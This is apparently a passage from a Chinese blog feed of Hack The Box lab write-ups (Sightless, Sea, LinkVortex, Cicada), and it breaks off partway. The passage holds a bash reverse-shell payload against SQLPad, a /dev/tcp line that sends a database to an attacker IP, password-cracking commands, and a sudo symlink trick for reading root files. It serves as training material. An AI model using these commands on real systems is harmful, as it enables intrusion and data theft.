-c \&quot;bash -i &gt;&amp; /dev/tcp/$&#123;IP&#125;/$&#123;PORT&#125; 0&gt;&amp;1\&quot;&#x27;) &#125;&#125;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">response=$(curl -s -X POST <span class="string">&#x27;http://sqlpad.sightless.htb/api/connections&#x27;</span> \</span><br><span class="line"></span><br><span class="line">-H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line"></span><br><span class="line">-d <span class="string">&quot;<span class="variable">$payload</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span>=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$response</span>&quot;</span> | jq -r <span class="string">&#x27;.id&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">curl -s <span class="string">&quot;http://sqlpad.sightless.htb/api/connections/<span class="variable">$&#123;id&#125;</span>/schema&quot;</span> &amp;&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734151629727-7bf9cb14-d95e-41e5-a2e9-813b2007a16b.png" alt=""></p><p>拿到了shell</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734151725237-de976ada-e6fb-4127-b69d-a48e8fc92139.png" alt=""></p><p>发现了一个sqlite，所以我们直接用sqlite的语法进行查看一下，但是他本机没有sqlite3这个命令所以我们拿到本地进行查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">cat</span> sqlpad.sqlite &gt;&amp; /dev/tcp/10.10.16.10/1234 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqlite3 sqlpad.sqlite</span><br><span class="line"></span><br><span class="line">.table</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * from user;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734152241370-28d89107-11b7-4de2-aa87-81fea579ff43.png" alt=""></p><p>发现了一些用户的凭证信息可以用hashid识别一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734152806948-064999a1-868d-4d97-a89b-5a646cfba2fa.png" alt=""></p><p>可以看到是brypt所以可以爆破一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734152288623-a6d494d1-259b-4caa-913b-767366e76257.png" alt=""></p><p>在爆破的同时在他本机的机器上查看shadow文件发现了root和michael用户的hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt htb.hash</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开始进行爆破普通用户的密码</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734152610716-a949dd51-3832-48b1-b44a-f6a172762698.png" alt=""></p><p>可以爆破出来所以我们登录一下他的机器</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734152930610-06e63a6f-2ed2-44b3-9ec2-6821714e5cb8.png" alt=""></p><p>可以拿到他的user flag</p><h2 id="提权">提权</h2><p>把小乌龟的脚本上传一下inpeas.sh看看有什么可以用的吗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rsync linpeas.sh michael@10.10.11.32:/home/michael</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到扫描结果</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734153686187-0eda924a-f415-45ac-93c7-c03f3b9d70fd.png" alt=""></p><p>开起了80 端口和8080端口我们映射出来看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734153810783-c389f045-4722-4963-a345-bef82fe453c3.png" alt=""></p><p>可以看到是一个登录界面，去搜了一下这个框架的洞找不到。另外发现这个john用户在远程调试谷歌浏览器，之前没了解过去查查</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734153613378-d2f7e82f-0b18-406d-bd11-223711a33f43.png" alt=""></p><p>参考一下这个文章：<a href="https://blog.51cto.com/u_15061934/4075994">https://blog.51cto.com/u_15061934/4075994</a>了解远程调试</p><p>先将调试的端口转发到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -L 35871:127.0.0.1:35871 michael@10.10.11.32</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到密码</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734155964871-6ee59ac3-4202-43db-a890-f4f0e34e25f7.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734156308082-eeff4d88-f678-400f-8a8e-dda8577f166f.png" alt=""></p><p>开启一下这个fpm</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734156089628-6c948bb8-c476-448c-924a-35c0ea26e884.png" alt=""></p><p>这时候由于没有权限所以chmod 77 /tmp/id_rsa在拖到本地在执行一次就可以了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734160724865-3f216b8e-c64d-40ab-a549-92d698c09d66.png" alt=""></p><p>获取root的密钥登录拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
    <category term="Linux" scheme="https://oceanzbz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Sea</title>
    <link href="https://oceanzbz.github.io/post/b38487d7.html"/>
    <id>https://oceanzbz.github.io/post/b38487d7.html</id>
    <published>2024-12-30T07:24:48.000Z</published>
    <updated>2025-03-05T07:24:36.811Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sC -sV -O <span class="number">10.10</span><span class="number">.11</span><span class="number">.28</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734504879061-5c3f3318-02f2-4d8f-8e65-709ebd29bf9e.png" alt=""></p><p>这是扫描结果开放了80，22端口去访问80端口看看信息</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734505078956-325ea2fb-637e-4dc6-b418-ae9ef38dd08a.png" alt=""></p><p>在点击这个contact链接的时候给我们跳到一个域名上去了发现访问不了所以考虑加入hosts解析。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734505486604-eb683fdf-df38-4b06-b070-211cf7df1db1.png" alt=""></p><p>然后我们用dirsearch、gobuster同时扫描下目录看看有什么发现，这是dirsearch的结果</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734505427746-2bf12118-6207-4b47-ade4-c63089419351.png" alt=""></p><p>可以看到扫描出的结果都是我们能够在页面点击到的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://sea.htb -w /usr/share/dirbuster/wordlists/directory-<span class="built_in">list</span>-<span class="number">2.3</span>-medium.txt -x ,.php,.<span class="built_in">zip</span>,.rar,.txt,.html,.git,.svn</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在扫描的过程中我们去搜索下cms中的特征velik71找到一个漏洞跟他有关系尝试利用一下</p><h2 id="漏洞利用">漏洞利用</h2><p>参考：<a href="https://github.com/insomnia-jacob/CVE-2023-41425">https://github.com/insomnia-jacob/CVE-2023-41425</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734507794275-6f26f0f6-93ca-40a8-bc66-c7e8897c3476.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734507779460-4c94d948-d3f1-4f7b-8bf1-6b797d697fac.png" alt=""></p><p>可以看到成功接收到shell</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734507922009-e4f85342-95e1-4a38-a257-3d4162077973.png" alt=""></p><p>去网站根目录下/var/www/sea/ 翻翻文件翻到一个js文件里面存在密码</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734507989877-df25a064-12a1-4356-a5c8-3effe9005a75.png" alt=""></p><p>使用字典爆破一下，记得把\去掉在用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$2y$<span class="number">10</span>$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hashcat <span class="string">&#x27;$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q&#x27;</span> -m <span class="number">3200</span> /usr/share/wordlists/rockyou.tx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>爆破出来密码</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734513118285-3edeb020-8e6a-4e40-aab8-c021e2032d2e.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734513171339-efab214f-84db-4cb5-a3ef-93a8e57148f7.png" alt=""></p><p>看到他家目录下有俩用户登录试试，使用amay登录成功</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734513493978-787a3f7a-d6c1-43a8-9685-8669785f2232.png" alt=""></p><h2 id="提权">提权</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734513730397-f716f4a2-2bea-4613-8dd7-6bc96e804b35.png" alt=""></p><p>看到开放了8080 和 48551端口 映射到我们本地访问一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -L <span class="number">8080</span>:localhost:<span class="number">8080</span> amay@sea.htb</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734514089952-fea84e6e-c4f6-41bf-8144-dbf1a48dfaff.png" alt=""></p><p>抓包看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734514179994-56749bbf-13f9-44a0-b686-440c474dd760.png" alt=""></p><p>发现可以任意文件读取</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734514378807-a7745e77-baf6-429c-9ce7-ed45fbc60ba6.png" alt=""></p><p>并且可以进行命令执行直接读取flag即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
    <category term="Linux" scheme="https://oceanzbz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>LinkVortex</title>
    <link href="https://oceanzbz.github.io/post/ce33d730.html"/>
    <id>https://oceanzbz.github.io/post/ce33d730.html</id>
    <published>2024-12-30T07:24:38.000Z</published>
    <updated>2025-03-05T07:24:36.811Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端口扫描">端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sCV -A -T4 10.10.11.47</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733892650939-385f482c-2c18-4ad8-9c59-1c9ac19e1533.png" alt=""></p><p>可以发现扫到了域名，那么就是写入hosts</p><h2 id="子域名爆破">子域名爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -u http://linkvortex.htb/ -H <span class="string">&quot;Host:FUZZ.linkvortex.htb&quot;</span> -mc 200</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ffuf工具用法参考：<a href="https://blog.csdn.net/weixin_44288604/article/details/128444485">https://blog.csdn.net/weixin_44288604/article/details/128444485</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733892861174-e6fca4da-4071-411f-b953-936e1200e7f1.png" alt=""></p><p>扫描出一个dev子域名同样也加入到hosts里面</p><h2 id="目录扫描">目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dirsearch -u http://linkvortex.htb/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扫描出来有个robots.txt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733892976586-85d197dd-e24b-4c89-b374-fe08873ddd13.png" alt=""></p><p>看到有个ghost进去看看发现是个登录页面，所以需要找到账户和密码，再去扫描子域名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dirsearch -u http://dev.linkvortex.htb/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733893029816-e9b61ff2-8579-4625-a59a-e6c636b6f8be.png" alt=""></p><p>发现了git泄漏</p><h2 id="Git泄漏">Git泄漏</h2><p>直接用githack</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python2 GitHack.py http://dev.linkvortex.htb/.git/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733893317099-c48f3b45-bc0e-4d92-ac7a-978a731d2a57.png" alt=""></p><p>可以在里面找到登录的用户名密码</p><h2 id="CVE-CVE-2023-40028">CVE-CVE-2023-40028</h2><p>这里就是漏洞脚本主要就是改里面的地址就可以了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733906422060-c7e6085e-5eb3-4302-9d39-3c0cc6dc1862.png" alt=""></p><p>然后看docker里的文件能看到ssh用户密码</p><p>连上之后sudo -l</p><p>检查 Bob 的命令权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bob@linkvortex:~$ sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for bob on linkvortex:</span><br><span class="line"></span><br><span class="line">env_reset, mail_badpass,</span><br><span class="line"></span><br><span class="line">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,</span><br><span class="line"></span><br><span class="line">env_keep+=CHECK_CONTENT</span><br><span class="line"></span><br><span class="line">User bob may run the following commands on linkvortex:</span><br><span class="line"></span><br><span class="line">(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看这个 <code>/opt/ghost/clean_symlink.sh</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">QUAR_DIR=&quot;/var/quarantined&quot;</span><br><span class="line"></span><br><span class="line">if [ -z $CHECK_CONTENT ];then</span><br><span class="line"></span><br><span class="line">CHECK_CONTENT=false</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">LINK=$1</span><br><span class="line"></span><br><span class="line">if ! [[ &quot;$LINK&quot; =~ \.png$ ]]; then</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;! First argument must be a png file !&quot;</span><br><span class="line"></span><br><span class="line">exit 2</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if /usr/bin/sudo /usr/bin/test -L $LINK;then</span><br><span class="line"></span><br><span class="line">LINK_NAME=$(/usr/bin/basename $LINK)</span><br><span class="line"></span><br><span class="line">LINK_TARGET=$(/usr/bin/readlink $LINK)</span><br><span class="line"></span><br><span class="line">if /usr/bin/echo &quot;$LINK_TARGET&quot; | /usr/bin/grep -Eq &#x27;(etc|root)&#x27;;then</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;! Trying to read critical files, removing link [ $LINK ] !&quot;</span><br><span class="line"></span><br><span class="line">/usr/bin/unlink $LINK</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;Link found [ $LINK ] , moving it to quarantine&quot;</span><br><span class="line"></span><br><span class="line">/usr/bin/mv $LINK $QUAR_DIR/</span><br><span class="line"></span><br><span class="line">if $CHECK_CONTENT;then</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;Content:&quot;</span><br><span class="line"></span><br><span class="line">/usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>如果文件名后缀是</strong>** <strong><code>**.png**</code></strong>，并且文件是符号链接**，且目标路径 <strong>不包含</strong>** <strong><code>**etc**</code></strong> <strong><strong>或</strong></strong> **<code>**root**</code>（即目标不是敏感文件），脚本会：</p><ul><li><p>将符号链接 <strong>移动到</strong>** **<code>**/var/quarantined**</code> 目录。</p></li><li><p>如果 <code>CHECK_CONTENT=true</code>，脚本会尝试输出该文件的内容。</p></li></ul><p>然后创建符号链接，连接到 root.txt 下，由于脚本会检查参数，可以使用二次链接来进行绕过，同时将 <code>CHECK_CONTENT</code> 设置为 true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bob@linkvortex:~$ ln -s /root/root.txt hyh.txt</span><br><span class="line"></span><br><span class="line">bob@linkvortex:~$ ln -s /home/bob/hyh.txt hyh.png</span><br><span class="line"></span><br><span class="line">bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hyh.png</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.hyhforever.top/htb-linkvortex/">https://www.hyhforever.top/htb-linkvortex/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;端口扫描&quot;&gt;端口扫描&lt;/h2&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
    <category term="Linux" scheme="https://oceanzbz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Cicada</title>
    <link href="https://oceanzbz.github.io/post/f78ecaca.html"/>
    <id>https://oceanzbz.github.io/post/f78ecaca.html</id>
    <published>2024-12-30T07:24:21.000Z</published>
    <updated>2025-03-05T07:24:36.810Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端口扫描">端口扫描</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扫描结果</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734075856023-773cc0ea-7f5a-465d-9323-ee954d9cbbad.png" alt=""></p><h2 id="smb连接">smb连接</h2><p>发现开放445端口有smb服务，连接试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">smbclient -L //<span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076142025-6a80e229-a256-4390-b217-f3d769c6ddb0.png" alt=""></p><p>发现需要密码使用免密登录试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">smbclient -N //<span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">enum4linux -a -u guest <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076186257-dccd6476-db0a-4137-a280-1201f41c5eed.png" alt=""></p><p>把这个文件下载下来看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">get <span class="string">&quot;Notice from HR.txt&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734076286015-088784ed-5382-4b79-83e5-a6be2c419433.png" alt="">获取到一个默认的密码Cicada$M6Corpb*@Lp#nZp!8</p><h2 id="Rid爆破">Rid爆破</h2><p>**crackmapexec **工具使用：<a href="https://www.cnblogs.com/Yang34/p/14411497.html">https://www.cnblogs.com/Yang34/p/14411497.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">crackmapexec smb <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span> -u <span class="string">&quot;guest&quot;</span> -p <span class="string">&quot;&quot;</span> --rid-brute|grep <span class="string">&quot;SidTypeUser&quot;</span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">nxc smb <span class="number">10.10</span><span class="number">.11</span><span class="number">.35</span> -u guest -p <span class="string">&#x27;&#x27;</span> --rid-brute --users</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是两个工具爆破得到的结果</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734077772269-c870e59a-2605-48b6-b7e0-2582c75e0dc0.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734077677713-b7efcf44-c928-4826-9fc6-397e002cf836.png" alt=""></p><p>其实都是差不多的可以得到用户名列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john.smouldersarah.danteliamichael.wrightsondavid.oreliousemily.oscars</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>遍历用户名密码看哪个正确</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">crackmapexec ldap cicada.htb -u usernames.txt -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现对michael.wrightson用户可用</p><h2 